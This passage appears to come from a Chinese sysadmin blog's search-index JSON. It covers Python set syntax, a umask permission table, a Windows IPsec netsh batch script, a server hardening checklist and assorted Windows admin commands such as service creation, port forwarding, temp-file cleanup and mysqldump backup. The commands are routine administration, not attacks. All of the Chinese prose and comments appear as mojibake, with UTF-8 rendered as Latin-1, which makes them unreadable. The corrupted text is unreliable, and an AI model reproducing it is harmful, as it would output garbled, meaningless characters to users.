æ˜¯ä¸æ˜¯arr3 çš„å­é›†, è¿”å›True/false arr7 = arr1.issubset(arr3) print(arr7) # åˆ¤æ–­ arr1 æ˜¯ä¸æ˜¯arr3 çš„çˆ¶é›†, è¿”å›True/fal","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:0:0","tags":["linux","python"],"title":"Python åŸºç¡€è¯­æ³•","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"Umaskç æƒé™å¯¹ç…§è¡¨,æ–¹ä¾¿æŸ¥è¯¢ï¼Œä¸ç”¨åœ¨å»è®¡ç®—äº†","date":"2022-06-24","objectID":"/posts/linux/umask%E7%A0%81%E6%9D%83%E9%99%90%E5%AF%B9%E7%85%A7%E8%A1%A8/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"Umaskç æƒé™å¯¹ç…§è¡¨","uri":"/posts/linux/umask%E7%A0%81%E6%9D%83%E9%99%90%E5%AF%B9%E7%85%A7%E8%A1%A8/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"Umask ç æƒé™å¯¹ç…§è¡¨ umask file dir 000 666 777 001 666 776 002 664 775 003 664 774 004 662 773 005 662 772 006 660 771 007 660 770 010 666 767 011 666 766 012 664 765 013 664 764 014 662 763 015 662 762 016 660 761 017 660 760 020 646 757 021 646 756 022 644 755 023 644 754 024 642 753 025 642 752 026 640 751 027 640 750 030 646 747 031 646 746 032 644 745 033 644 744 034 642 743 035 642 742 036 640 741 037 640 740 040 626 737 041 626 736 042 624 735 043 624 734 044 622 733 045 622 732 046 620 731 047 620 730 050 626 727 051 626 726 052 624 725 053 624 724 054 622 723 055 622 722 056 620 721 057 620 720 060 606 717 061 606 716 062 604 715 063 604 714 064 602 713 065 602 712 066 600 711 067 600 710 070 606 707 071 606 706 072 604 705 073 604 704 074 602 703 075 602 702 076 600 701 077 600 700 100 666 677 101 666 676 102 664 675 103 664 674 104 662 673 105 662 672 106 660 671 107 660 670 110 666 667 111 666 666 112 664 665 113 664 664 114 662 663 115 662 662 116 660 661 117 660 660 120 646 657 121 646 656 122 644 655 123 644 654 124 642 653 125 642 652 126 640 651 127 640 650 130 646 647 131 646 646 132 644 645 133 644 644 134 642 643 135 642 642 136 640 641 137 640 640 140 626 637 141 626 636 142 624 635 143 624 634 144 622 633 145 622 632 146 620 631 147 620 630 150 626 627 151 626 626 152 624 625 153 624 624 154 622 623 155 622 622 156 620 621 157 620 620 160 606 617 161 606 616 162 604 615 163 604 614 164 602 613 165 602 612 166 600 611 167 600 610 170 606 607 171 606 606 172 604 605 173 604 604 174 602 603 175 602 602 176 600 601 177 600 600 200 466 577 201 466 576 202 464 575 203 464 574 204 462 573 205 462 572 206 460 571 207 460 570 210 466 567 211 466 566 212 464 565 213 464 564 214 462 563 215 462 562 216 460 561 217 460 560 220 446 557 221 446 556 222 444 555 223 444 554 224 442 553 225 442 552 226 440 551 227 440 550 230 446 547 231 446 546 232 444 545 233 444 544 234 442 543 235 442 542 236 440 541 237 440 540 240 426 537 241 426 536 242 424 535 243 424 534 244 422 533 245 422 532 246 420 531 247 420 530 250 426 527 251 426 526 252 424 525 253 424 524 254 422 523 255 422 522 256 420 521 257 420 520 260 406 517 261 406 516 262 404 515 263 404 514 264 402 513 265 402 512 266 400 511 267 400 510 270 406 507 271 406 506 272 404 505 273 404 504 274 402 503 275 402 502 276 400 501 277 400 500 300 466 477 301 466 476 302 464 475 303 464 474 304 462 473 305 462 472 306 460 471 307 460 470 310 466 467 311 466 466 312 464 465 313 464 464 314 462 463 315 462 462 316 460 461 317 460 460 320 446 457 321 446 456 322 444 455 323 444 454 324 442 453 325 442 452 326 440 451 327 440 450 330 446 447 331 446 446 332 444 445 333 444 444 334 442 443 335 442 442 336 440 441 337 440 440 340 426 437 341 426 436 342 424 435 343 424 434 344 422 433 345 422 432 346 420 431 347 420 430 350 426 427 351 426 426 352 424 425 353 424 424 354 422 423 355 422 422 356 420 421 357 420 420 360 406 417 361 406 416 362 404 415 363 404 414 364 402 413 365 402 412 366 400 411 367 400 410 370 406 407 371 406 406 372 404 405 373 404 404 374 402 403 375 402 402 376 400 401 377 400 400 400 266 377 401 266 376 402 264 375 403 264 374 404 262 373 405 262 372 406 260 371 407 260 370 410 266 367 411 266 366 412 264 365 413 264 364 414 262 363 415 262 362 416 260 361 417 260 360 420 246 357 421 246 356 422 244 355 423 244 354 424 242 353 425 242 352 426 240 351 427 240 350 430 246 347 431 246 346 432 244 345 433 244 344 434 242 343 435 242 342 436 240 341 437 240 340 440 226 337 441 226 336 442 224 335 443 224 334 444 222 333 445 222 332 446 220 331 447 220 330 450 226 327 451 226 326 452 224 325 453 224 324 454 222 323 455 222 322 456 220 321 457 220 320 460 206 317 461 206 316 462 204 315 463 204 314 464 202 313 465 202 312 466 200 311 467 200 310 470 206 307 471 206 306 472 204 305 473 204 304 474 202 303 475 202 302 476 200 301 477 200 300 500 266 277 501 266 276 502 264 275 503 264 274 504 262 273 505 262 272 506 260 271 507 260 270 510 266 267 511 266 266 512 264 265 ","date":"2022-06-24","objectID":"/posts/linux/umask%E7%A0%81%E6%9D%83%E9%99%90%E5%AF%B9%E7%85%A7%E8%A1%A8/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"Umaskç æƒé™å¯¹ç…§è¡¨","uri":"/posts/linux/umask%E7%A0%81%E6%9D%83%E9%99%90%E5%AF%B9%E7%85%A7%E8%A1%A8/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"IPSEC","date":"2022-06-24","objectID":"/posts/scripts/bat/ipsec/","tags":["bat","ipsec","windows","scripts"],"title":"windows æœ¬åœ°å®‰å…¨ç­–ç•¥è®¾ç½®","uri":"/posts/scripts/bat/ipsec/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"å¼€æœºä¸´æ—¶å…³é—­æœ¬åœ°å®‰å…¨ç­–ç•¥(é˜²æ­¢é…ç½®å‡ºé”™ï¼Œå¯¼è‡´æ— æ³•ç™»å½•) netsh ipsec static set policy name=æˆ‘çš„è§„åˆ™ assign=n ping 127.0 -n 300 \u003enul 2\u003enul netsh ipsec static set policy name=æˆ‘çš„è§„åˆ™ assign=y net start PolicyAgent æœ¬åœ°å®‰å…¨ç­–ç•¥åˆå§‹åŒ–è®¾ç½®è„šæœ¬ @echo off title DD-IPç­–ç•¥è®¾ç½® color 0A echo ä¸€èˆ¬é…ç½®ä¸º\"1\"å³å¯(æ³¨:éœ€è¦ä¸»åŠ¨é…ç½®ä¿¡ä»»çš„è¿œç¨‹ip) echo è®¾ç½®ipsecå‰é¦–å…ˆè¦å…³é—­ç³»ç»Ÿé˜²ç«å¢™ã€‚ echo windows2003å¯ä»¥åœæ­¢æœåŠ¡ï¼Œä½†æ˜¯2008ä¸‹åªèƒ½å…³é—­ï¼Œä¸èƒ½åœæ­¢æœåŠ¡ echo ç¡®è®¤ä¹‹åæŒ‰ä»»æ„é”®ç»§ç»­ pause :menu cls echo 1 å…¬ç½‘æœåŠ¡å™¨åŸºæœ¬é…ç½®(åŸºæœ¬ç«¯å£) echo 2 äºšé©¬é€Šå†…ç½‘ç½‘æ®µä¿¡ä»»(172.31.0.0/16) echo 3 lefuxæœºæˆ¿å†…éƒ¨æœåŠ¡å™¨åŸºæœ¬é…ç½® echo 4 é‚®ä»¶æœåŠ¡å™¨ echo 5 VPNæœåŠ¡å™¨ echo 6 DNSæœåŠ¡å™¨ echo 7 æ·»åŠ æœ¬æœºIPæ®µ echo 8 FTPå¯¹å¤–è§„åˆ™ echo 10 æ¿€æ´»ç­–ç•¥ echo q é€€å‡º set /p convert=è¯·é€‰æ‹© if \"%CONVERT%\"==\"1\" goto a if \"%CONVERT%\"==\"2\" goto b if \"%CONVERT%\"==\"3\" goto c if \"%CONVERT%\"==\"4\" goto d if \"%CONVERT%\"==\"5\" goto e if \"%CONVERT%\"==\"6\" goto f if \"%CONVERT%\"==\"7\" goto g if \"%CONVERT%\"==\"8\" goto h if \"%CONVERT%\"==\"10\" goto i if \"%CONVERT%\"==\"q\" goto ext echo äº²ï¼Œä½ çš„é€‰æ‹©æ— æ•ˆï¼Œä½ åªèƒ½é€‰æ‹©1-10 æˆ–è€… qæ‰å¯ä»¥å“Ÿï¼Œå†è¯•è¯•å§ï¼ ping -n 5 127.0.0.1 \u003e null echo. goto menu :a echo æœåŠ¡å™¨IPç­–ç•¥åŸºæœ¬é…ç½® :: å»ºç«‹ä¸€ä¸ªåå­—å«â€œæˆ‘çš„è§„åˆ™â€çš„å®‰å…¨ç­–ç•¥å…ˆ netsh ipsec static add policy name=æˆ‘çš„è§„åˆ™ :: å»ºç«‹2æ¡æ“ä½œåŠ¨ä½œ netsh ipsec static add filteraction name=Permit action=permit netsh ipsec static add filteraction name=Block action=block ::å¯¹å¤–ç«¯å£è®¿é—®è§„åˆ™ netsh ipsec static add filterlist name=80port description=\"ä¸å…¶ä»–æœåŠ¡å™¨80ç«¯å£çš„äº¤äº’\" netsh ipsec static add filter filterlist=80port srcaddr=any dstaddr=me dstport=80 protocol=TCP description=\"å…è®¸å…¶ä»–æœåŠ¡å™¨è®¿é—®æœ¬æœº80ç«¯å£\" netsh ipsec static add filter filterlist=80port srcaddr=any dstaddr=me dstport=443 protocol=TCP description=\"å…è®¸å…¶ä»–æœåŠ¡å™¨è®¿é—®æœ¬æœº443ç«¯å£\" ::å…è®¸æœ¬æœºè®¿é—®å…¶ä»–æœåŠ¡å™¨ç‰¹å®šçš„ç«¯å£ï¼Œå¦‚æœæ²¡æœ‰è¿™æ¡å°±åªèƒ½è®¿é—®ä¿¡ä»»IP netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=80 protocol=TCP description=\"å…è®¸æœ¬æœºè®¿é—®å…¶ä»–æœåŠ¡å™¨80\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=443 protocol=TCP description=\"å…è®¸æœ¬æœºè®¿é—®å…¶ä»–æœåŠ¡å™¨443ç«¯å£\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=53 protocol=TCP description=\"å…è®¸æœ¬æœºè®¿é—®å…¶ä»–æœåŠ¡å™¨DNSç«¯å£\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=53 protocol=UDP description=\"å…è®¸æœ¬æœºè®¿é—®å…¶ä»–æœåŠ¡å™¨DNSç«¯å£\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any protocol=ICMP description=\"å…è®¸æœ¬æœºpingå…¶ä»–æœåŠ¡å™¨\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=25 protocol=TCP description=\"å…è®¸æœ¬æœºè®¿é—®å…¶ä»–æœåŠ¡å™¨25\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=110 protocol=TCP description=\"å…è®¸æœ¬æœºè®¿é—®å…¶ä»–æœåŠ¡å™¨çš„110ç«¯å£ï¼Œ110ç«¯å£æ˜¯ä¸ºPOP3ï¼ˆé‚®ä»¶åè®®3ï¼‰æœåŠ¡å¼€æ”¾çš„\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=143 protocol=TCP description=\"å…è®¸æœ¬æœºè®¿é—®å…¶ä»–æœåŠ¡å™¨143ç«¯å£ï¼Œ143ç«¯å£ä¸»è¦æ˜¯ç”¨äºIMAPï¼‰\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=465 protocol=TCP description=\"å…è®¸æœ¬æœºè®¿é—®å…¶ä»–æœåŠ¡å™¨465ç«¯å£ï¼Œ465ç«¯å£æ˜¯ä¸ºSMTPS(SMTP-over-SSL)åè®®æœåŠ¡å¼€æ”¾çš„\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=995 protocol=TCP description=\"å…è®¸æœ¬æœºè®¿é—®å…¶ä»–æœåŠ¡å™¨995ç«¯å£ï¼Œ995ç«¯å£æ˜¯ä¸ºPOP3S(POP3-over-SSL)åè®®æœåŠ¡å¼€æ”¾çš„\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=993 protocol=TCP description=\"å…è®¸æœ¬æœºè®¿é—®å…¶ä»–æœåŠ¡å™¨993ç«¯å£ï¼Œ993ç«¯å£æ˜¯ä¸ºIMAPS(IMAP-over-SSL)åè®®æœåŠ¡å¼€æ”¾çš„\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=123 protocol=UDP description=\"windowsæ—¶é—´æ›´æ–°\" ::netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=123 protocol=TCP description=\"windowsæ—¶é—´æ›´æ–°\" netsh ipsec static add rule name=80port policy=æˆ‘çš„è§„åˆ™ filterlist=80port filteraction=Permit :: å»ºç«‹ä¿¡ä»»IPè§„åˆ™ netsh ipsec static add filterlist name=AllowIP description=\"ä¿¡ä»»IP\" :: ############### æ­¤å¤„æ·»åŠ  è¿œç¨‹ä¿¡ä»»çš„è®¿é—®IP ############### ::å…¬å¸ç½‘ç»œå‡ºå£ip :: netsh ipsec static add filter filterlist=AllowIP srcaddr=xx.xx.xx.xx srcmask=255.255.255.255 dstaddr=me description=\"å…¬å¸ç½‘ç»œå‡ºå£ip\" ::-----------------------------------å…¶ä»–å¤–ç½‘æœåŠ¡å™¨------------------------- ::VPNæœåŠ¡å™¨ :: netsh ipsec static add filter filterlist=AllowIP srcaddr=xx.xx.xx.xx dstaddr=me description=\"ä¸­è½¬æœåŠ¡å™¨\" netsh ipsec static add rule name=AllowIP policy=æˆ‘çš„è§„åˆ™ filterlist=AllowIP filteraction=Permit :: å»ºç«‹ä¸€æ¡æ‹’ç»æ‰€æœ‰IPè®¿é—®è§„åˆ™ netsh ipsec static add filterlist name=DenyIP description=\"æ‹’ç»æ‰€æœ‰IP\" ::æ‹’ç»æ‰€æœ‰IPåœ°å€è®¿é—®æœ¬æœº--è¿›é™åˆ¶ net","date":"2022-06-24","objectID":"/posts/scripts/bat/ipsec/:0:0","tags":["bat","ipsec","windows","scripts"],"title":"windows æœ¬åœ°å®‰å…¨ç­–ç•¥è®¾ç½®","uri":"/posts/scripts/bat/ipsec/"},{"categories":["windows","è¿ç»´è®°äº‹"],"content":"å®‰è£…ä¼˜åŒ–","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/","tags":["windows"],"title":"windowså®‰è£…ä¼˜åŒ–","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","è¿ç»´è®°äº‹"],"content":"1. ç³»ç»Ÿå®‰å…¨ æ˜¾ç¤ºç”µè„‘å›¾æ ‡åˆ°æ¡Œé¢: rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0 å¼€å§‹æ–‡ä»¶å¤¹: shell:startup æœ¬åœ°å®‰å…¨ç­–ç•¥: secpol.msc è®¡ç®—æœºç®¡ç†: compmgmt.msc 1.1. ä¿®æ”¹æœåŠ¡å™¨åï¼šæŒ‰é¡¹ç›®å–åã€‚ å³é”®ç‚¹å‡»æˆ‘çš„ç”µè„‘-é«˜çº§-è®¡ç®—æœºå-æ›´æ”¹ã€‚è‹±æ–‡: my computer - proterties - Advanced system settings - Computer Name - Change 1.2. è°ƒæ•´æ€§èƒ½è®¾ç½®ï¼š å³é”®ç‚¹å‡»æˆ‘çš„ç”µè„‘-é«˜çº§-æ€§èƒ½ä¸­ï¼Œé€‰ä¸­â€œè®¾ç½®ä¸ºæœ€ä½³æ€§èƒ½â€è‹±æ–‡: my computer - proterties-Advanced - Performance-setting -Visual Effects (Adjust for best performance)ï¼› æ•°æ®æ‰§è¡Œä¿æŠ¤è®¾ç½®ä¸ºâ€œåªä¸ºå…³é”®çš„windowsç¨‹åºä¿æŠ¤â€ã€‚ 1.3. å…è®¸ dump file çš„äº§ç”Ÿï¼š å³é”®ç‚¹å‡»æˆ‘çš„ç”µè„‘-é«˜çº§-å¯åŠ¨å’Œæ•…éšœæ¢å¤-å†™å…¥è°ƒè¯•ä¿¡æ¯ è®¾ç½®æˆâ€œæœ€å°åŒ–è®°å½•æ¨¡å¼â€ã€‚è‹±æ–‡ç‰ˆæ“ä½œï¼šå³å‡» My Computer-Advanced-Startup and recovery-write debugging infomationè®¾ç½®æˆâ€œsmallâ€¦â€ã€‚ 1.4. ç¦ç”¨ NETBOIS: ç½‘ç»œè¿æ¥å±æ€§-tcpip å±æ€§-é«˜çº§-wins-NetBios è®¾ç½® â€œç¦ç”¨ Tcp/ip ä¸Šçš„ NetBiosâ€é€‰é¡¹ 1.5. ç¦æ­¢è®¾ç½®ç½‘å¡ä¸º Disable è¿è¡Œgpedit.msc- ç”¨æˆ·é…ç½®-ç®¡ç†æ¨¡æ¿-ç½‘ç»œ-ç½‘ç»œè¿æ¥ä¸‹çš„\"å¯ç”¨/ç¦ç”¨ LAN é“¾æ¥çš„èƒ½åŠ›(Ability to Enable/Disable a LAN connection)â€œè®¾ç½®ä¸ºDisabled è®¾ç½®\"ä¸ºç®¡ç†å‘˜å¯ç”¨windows2000ç½‘è·¯è¿æ¥è®¾ç½®(Enable Windows2000 Network Connections settings for Administrators)â€ é€‰é¡¹ä¸ºEnabled 1.6. IIS å®‰è£…åä¿®æ”¹ç«™ç‚¹æ—¥å¿—ç›®å½• 2. ç”¨æˆ·å®‰å…¨ netplwizç”¨æˆ·åä¿®æ”¹,å®‰å…¨ç­–ç•¥é‡Œé¢ä¹Ÿæœ‰è®¾ç½®æ–¹æ³• ç¦ç”¨Guestè´¦å·(è®¾ç½®å¤æ‚å¯†ç ) é™åˆ¶ä¸å¿…è¦çš„ç”¨æˆ·(å¦‚aspnet,sqldebuggerç­‰) æŠŠç³»ç»ŸAdministratorè´¦å·æ”¹å åˆ›å»ºåç§°ä¸ºAdministratoré™·é˜±ç”¨æˆ· (æ­£ç¡®è®¾ç½®æè¿°ä¿¡æ¯,ä¸ç»™ä»»ä½•æƒé™) å»ºç«‹ä¸€ä¸ªå¤‡ç”¨ç®¡ç†å‘˜å¸æˆ·ã€‚ ä¸è®©ç³»ç»Ÿæ˜¾ç¤ºä¸Šæ¬¡ç™»å½•çš„ç”¨æˆ·å(åé¢æœ¬åœ°ç­–ç•¥ä¸­æœ‰) é€šè¿‡regè„šæœ¬è®¾ç½®å¼€æœºå‰ 5 åˆ†é’Ÿè‡ªåŠ¨ç™»å½• 3. æœ¬åœ°å®‰å…¨ç­–ç•¥è®¾ç½® 3.1. æœ¬åœ°å®‰å…¨ç­–ç•¥è®¾ç½® gpedit.msc-è®¡ç®—æœºé…ç½®-windowsè®¾ç½®-å®‰å…¨è®¾ç½® æœ¬åœ°ç­–ç•¥-å®¡æ ¸ç­–ç•¥ æ¨èçš„è¦å®¡æ ¸çš„é¡¹ç›®æ˜¯ï¼š ç­–ç•¥æ›´æ”¹ æˆåŠŸ å¤±è´¥ ç™»å½•äº‹ä»¶ æˆåŠŸ å¤±è´¥ å¯¹è±¡è®¿é—® å¤±è´¥ è¿‡ç¨‹è¿½è¸ª æ—  ç›®å½•æœåŠ¡è®¿é—® å¤±è´¥ ç‰¹æƒä½¿ç”¨ å¤±è´¥ ç³»ç»Ÿäº‹ä»¶ æˆåŠŸ å¤±è´¥ è´¦æˆ·ç™»å½•äº‹ä»¶ æˆåŠŸ å¤±è´¥ è´¦æˆ·ç®¡ç† æ—  è‹±æ–‡ç‰ˆï¼š Audit account logon events Success,Failure Audit account management No auditing Audit directory service access Failure Audit logon event Success,Failure Audit object access Failure Audit polic change Success,Failure Audit privilege use Failure Audit process tracking No auditing Audit system events Success,Failure æœ¬åœ°ç­–ç•¥â€”\u003eç”¨æˆ·æƒé™åˆ†é… å…³é—­ç³»ç»Ÿ(shut down the system)ï¼š åªæœ‰Administratorsç»„ã€å…¶å®ƒå…¨éƒ¨åˆ é™¤ã€‚Â é€šè¿‡ç»ˆç«¯æœåŠ¡å…è®¸ç™»é™†(Allow log on through Terminal services)ï¼š åªåŠ å…¥Administrators,RemoteÂ DesktopÂ Usersç»„ï¼Œå…¶ä»–å…¨éƒ¨åˆ é™¤ã€‚ Cã€æœ¬åœ°ç­–ç•¥â€”â€”\u003eå®‰å…¨é€‰é¡¹ äº¤äº’å¼ç™»é™†ï¼šä¸æ˜¾ç¤ºä¸Šæ¬¡çš„ç”¨æˆ·åã€€å¯ç”¨ ç½‘ç»œè®¿é—®ï¼šä¸å…è®¸SAMå¸æˆ·å’Œå…±äº«çš„åŒ¿åæšä¸¾ã€€å¯ç”¨ ç½‘ç»œè®¿é—®ï¼šä¸å…è®¸ä¸ºç½‘ç»œèº«ä»½éªŒè¯å‚¨å­˜å‡­è¯ã€€å¯ç”¨ ç½‘ç»œè®¿é—®ï¼šå¯åŒ¿åè®¿é—®çš„å…±äº«ã€€å…¨éƒ¨åˆ é™¤ ç½‘ç»œè®¿é—®ï¼šå¯åŒ¿åè®¿é—®çš„å‘½åç®¡é“ã€€å…¨éƒ¨åˆ é™¤ ç½‘ç»œè®¿é—®ï¼šå¯è¿œç¨‹è®¿é—®çš„æ³¨å†Œè¡¨è·¯å¾„ã€€å…¨éƒ¨åˆ é™¤Â ç½‘ç»œè®¿é—®ï¼šå¯è¿œç¨‹è®¿é—®çš„æ³¨å†Œè¡¨è·¯å¾„å’Œå­è·¯å¾„ã€€å…¨éƒ¨åˆ é™¤Â å¸æˆ·ï¼šé‡å‘½åç³»ç»Ÿç®¡ç†å‘˜å¸æˆ·ã€€é‡å‘½åä¸€ä¸ªå¸æˆ·ï¼ˆæ¯”å¦‚administratoræ”¹æˆlefux,ä¸ä¸€å®šæ˜¯lefuxé—®æ¸…æ¥šå†æ”¹ï¼Œæ”¹åæœ€å¥½é‡å¯ä¸€ä¸‹æœåŠ¡å™¨ï¼‰ è‹±æ–‡ç‰ˆæœ¬ï¼š Interactive logon: Do not display last user name Enabled Network access: Do not allow anonymous enumeration of SAM accounts and share Enabled Network access: Do not allow storage of passwords and credentials for network authentication Enabled Network access: Named Pipes that can be accessed anonymously å…¨åˆ é™¤ Network access: Remotely accessible registry paths å…¨åˆ é™¤ Network access: Remotely accessible registry paths and subpaths å…¨åˆ é™¤ Network access: Shares that can be accessed anonymously å…¨åˆ é™¤ 4. ç¦ç”¨ä»¥ä¸‹çš„æœåŠ¡ Computer Browserï¼›Portable Media Serial Number Service Distributed File System; Windows Audio; Alert Distributed linktracking clientï¼š Error reporting serviceï¼š FTP Publishing Service Messenger Indexing Service Microsoft Serchï¼š NT LM Security support provideï¼š server PrintSpoolerï¼š Remote Desktop Help Session Managerï¼š Remote Registry; Routing and Remote Access Workstation (ç¾å›½æœåŠ¡å™¨ä¸è¦å…³) ç»æµ‹è¯•å¯ä»¥å…³é—­çš„å…¶ä»–æœåŠ¡ä¹Ÿå¯ä»¥å…³ ","date":"2022-06-24","objectID":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/:0:0","tags":["windows"],"title":"windowså®‰è£…ä¼˜åŒ–","uri":"/posts/windows/%E5%AE%89%E8%A3%85%E4%BC%98%E5%8C%96/"},{"categories":["windows","è¿ç»´è®°äº‹"],"content":"å‘½ä»¤æ”¶é›†","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/","tags":["windows"],"title":"Windowså‘½ä»¤æ”¶é›†","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["windows","è¿ç»´è®°äº‹"],"content":"1. windows æœåŠ¡å®‰è£…å¸è½½ :: æ³¨æ„ç©ºæ ¼ sc create \"Memcached_11233\" start= auto binPath= \"D:\\box\\memcached\\memcached.exe -d runservice -m 128 -c 512 -p 11233 -l 127.0.0.1\" DisplayName= \"Memcached_11233\" ---- sc delete Memcached_11233 2. åˆ é™¤windows\\temp 5å¤©å‰ä»¥sess*å¼€å¤´çš„æ–‡ä»¶ forfiles /p \"C:\\Windows\\Temp\" /s /d -5 /m sess* /c \"cmd /c del /f /q /s @path\" 3. windows ç«¯å£è½¬å‘ :: è½¬å‘ä¸ç”Ÿæ•ˆéœ€å…ˆå®‰è£… ipv6 C:\\\u003e netsh interface ipv6 install :: è½¬å‘æœ¬æœºipç«¯å£ åˆ°å…¶ä»–æœåŠ¡å™¨ipç«¯å£ :: netsh interface portproxy add v4tov4 listenaddress=[å¤–ç½‘IP] listenport=[å¤–ç½‘ç«¯å£] connectaddress=[å†…ç½‘IP] connectport=[å†…ç½‘ç«¯å£] C:\\\u003e netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=10055 connectaddress=10.42.0.58 connectport=10050 :: æŸ¥çœ‹å·²è®¾ç½®çš„è½¬å‘ C:\\\u003e netsh interface portproxy show all :: åˆ é™¤ç«¯å£è½¬å‘ :: netsh interface portproxy delete v4tov4 listenaddress=[å¤–ç½‘IP] listenport=[å¤–ç½‘ç«¯å£] C:\\\u003e netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=10055 4. ä¿®æ”¹ntpåŒæ­¥é¢‘ç‡ regedit: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient\\SpecialPollInterval 900=15åˆ†é’Ÿ 3600=1å°æ—¶ é»˜è®¤: 604800æ˜¯ç”±7(å¤©)Ã—24(æ—¶)Ã—60(åˆ†)Ã—60(ç§’) 5. windows mysql å¤‡ä»½ @echo off title mysql-client set \"Ymd=%date:~,4%%date:~5,2%%date:~8,2%\" echo %Ymd% C: \"D:\\xx\\mysqldump.exe\" -h\u003cip\u003e -P\u003cport\u003e -u\u003cuser\u003e -p\u003cpasswrod\u003e -R \u003cæ•°æ®åº“åç§°\u003e \u003e D:\\DatabaseBak\\xxx_%Ymd%.sql 6. æŸ¥çœ‹80ç«¯å£è¿æ¥æ•° netstat -an -p tcp | find /c \"80\" 7. windows æ—¶é—´è·å–æ–¹å¼ :: ç¼–ç æ ¼å¼ ANSI :: è„šæœ¬åˆ›å»ºæ—¶æœ€å¥½é€‰æ‹©ANSIç¼–ç (é˜²æ­¢ä¸­æ–‡ä¹±ç ) :: @echo off è¡¨ç¤ºä¸å›æ˜¾æ‰§è¡Œçš„å‘½ä»¤ @echo off @echo =========Windowsçš„åŸæœ¬æ—¥æœŸæ—¶é—´æ ¼å¼======================= :: è®¾ç½®å˜é‡ï¼Œä½¿ç”¨å˜é‡æ—¶éœ€è¦ç”¨ä¸€å¯¹%åŒ…èµ·æ¥ set ORIGINAL_DATE=%date% echo %ORIGINAL_DATE% @echo =========æ—¥æœŸæŒ‰ç…§YYYY-MM-DDæ ¼å¼æ˜¾ç¤º====================== :: æ—¥æœŸæˆªå–éµä»æ ¼å¼ %date:~x,y%ï¼Œè¡¨ç¤ºä»ç¬¬xä½å¼€å§‹ï¼Œæˆªå–yä¸ªé•¿åº¦(x,yçš„èµ·å§‹å€¼ä¸º0) :: å¹´ä»½ä»ç¬¬0ä½å¼€å§‹æˆªå–4ä½ï¼Œæœˆä»½ä»ç¬¬5ä½å¼€å§‹æˆªå–2ä½ï¼Œæ—¥æœŸä»ç¬¬8ä½å¼€å§‹æˆªå–2ä½ set YEAR=%date:~0,4% set MONTH=%date:~5,2% set DAY=%date:~8,2% set CURRENT_DATE=%YEAR%-%MONTH%-%DAY% echo %CURRENT_DATE% @echo =========æ—¶é—´æŒ‰ç…§HH:MM:SSæ ¼å¼æ˜¾ç¤º======================== :: æ—¶é—´æˆªå–éµä»æ ¼å¼ %time:~x,y%ï¼Œè¡¨ç¤ºä»ç¬¬xä½å¼€å§‹ï¼Œæˆªå–yä¸ªé•¿åº¦(x,yçš„èµ·å§‹å€¼ä¸º0) :: æ—¶é’Ÿä»ç¬¬0ä½å¼€å§‹æˆªå–2ä½ï¼Œåˆ†é’Ÿä»ç¬¬3ä½å¼€å§‹æˆªå–2ä½ï¼Œç§’é’Ÿä»ç¬¬6ä½å¼€å§‹æˆªå–2ä½ set HOUR=%time:~0,2% set MINUTE=%time:~3,2% set SECOND=%time:~6,2% :: å½“æ—¶é’Ÿå°äºç­‰äº9æ—¶,å‰é¢æœ‰ä¸ªç©ºæ ¼ï¼Œè¿™æ—¶æˆ‘ä»¬å°‘æˆªå–ä¸€ä½ï¼Œä»ç¬¬1ä½å¼€å§‹æˆªå– set TMP_HOUR=%time:~1,1% set NINE=9 set ZERO=0 :: å¤„ç†æ—¶é’Ÿæ˜¯ä¸ªä½æ•°çš„æ—¶å€™å‰é¢è¡¥ä¸Šä¸€ä¸ª0, LEQè¡¨ç¤ºå°äºç­‰äºhttps://www.coder.work/article/6503907 if %HOUR% LEQ %NINE% set HOUR=%ZERO%%TMP_HOUR% set CURRENT_TIME=%HOUR%:%MINUTE%:%SECOND% echo %CURRENT_TIME% @echo =========æ—¥æœŸæ—¶é—´æŒ‰ç…§YYYY-MM-DD HH:MM:SSæ ¼å¼æ˜¾ç¤º========= set CURRENT_DATE_TIME=%YEAR%-%MONTH%-%DAY% %HOUR%:%MINUTE%:%SECOND% echo %CURRENT_DATE_TIME% @echo =========æ—¥æœŸæ—¶é—´æŒ‰ç…§YYYYMMDD_HHMMSSæ ¼å¼æ˜¾ç¤º============= set CURRENT_DATE_TIME_STAMP=%YEAR%%MONTH%%DAY%_%HOUR%%MINUTE%%SECOND% echo %CURRENT_DATE_TIME_STAMP% @echo ========================================================= pause 8. æŒ‰ç…§æ—¶é—´åˆ›å»ºæ–‡ä»¶å¤¹ :: ç¼–ç æ ¼å¼ ANSI :: 